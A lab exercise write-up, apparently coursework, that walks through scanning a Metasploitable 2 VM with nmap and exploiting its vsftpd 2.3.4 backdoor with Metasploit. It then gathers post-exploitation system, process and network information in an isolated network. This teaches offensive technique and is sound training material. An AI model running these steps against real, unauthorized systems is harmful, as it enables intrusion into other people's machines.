# Experiment 2: Simulated Ethical Hacking with Metasploit

## Objective

To perform a safe exploitation exercise on a virtual machine using Metasploit and understand the basic stages of ethical hacking.

## Environment

- Kali Linux (Attacker)
- Metasploitable 2 (Victim/Test)
- VirtualBox or VMware
- Host-Only Adapter or Internal Network

## Procedure

### Step 1: Configure Virtual Machines

Install Kali Linux and Metasploitable 2, configure both machines with a Host-Only Adapter or Internal Network, and boot both machines.

### Step 2: Verify Network Connectivity

Check the IP address of Metasploitable 2 and verify connectivity from Kali Linux.

On Metasploitable 2:

```bash
ifconfig
```

On Kali Linux:

```bash
ping <Metasploitable_IP>
```

### Step 3: Perform Reconnaissance

Scan Metasploitable 2 to identify open ports, services, and operating system details.

```bash
nmap -sS -sV -O <Metasploitable_IP>
```

### Step 4: Save Nmap Results

Save the scan results into a text file.

```bash
nmap -sS -sV -O -oN metasploitable_scan.txt <Metasploitable_IP>
```

### Step 5: Launch Metasploit

Start the Metasploit Framework.

```bash
msfconsole
```

### Step 6: Search for the Exploit

Search for the vsftpd exploit.

```bash
search vsftpd
```

### Step 7: Select the Exploit Module

Select the vsftpd 2.3.4 backdoor exploit module.

```bash
use exploit/unix/ftp/vsftpd_234_backdoor
```

### Step 8: Set the Target Host

Set the IP address of the Metasploitable 2 machine.

```bash
set RHOST <Metasploitable_IP>
```

### Step 9: Set the Target Port

Set the FTP service port.

```bash
set RPORT 21
```

### Step 10: Execute the Exploit

Execute the exploit against the Metasploitable 2 test machine.

```bash
exploit
```

### Step 11: Verify the Shell and System Information

Verify the command shell and gather basic system information.

```bash
whoami
uname -a
ifconfig
```

### Step 12: Check Processes and Network Services

View running processes and listening network services.

```bash
ps aux
netstat -tulnp
```

### Step 13: Create and View a Test File

Create and view a test file on the target machine.

```bash
echo "This is a test file" > /tmp/test.txt
cat /tmp/test.txt
```

## Result

The target machine was scanned, a known vulnerable service was identified, and a controlled exploitation exercise was performed using Metasploit in the lab environment.

## Conclusion

The experiment demonstrated the basic process of reconnaissance, exploitation, and post-exploitation using Nmap and Metasploit in a controlled virtual environment.

## Ethical Consideration

This experiment should be performed only on the provided Metasploitable 2 test machine or another explicitly authorized lab environment.
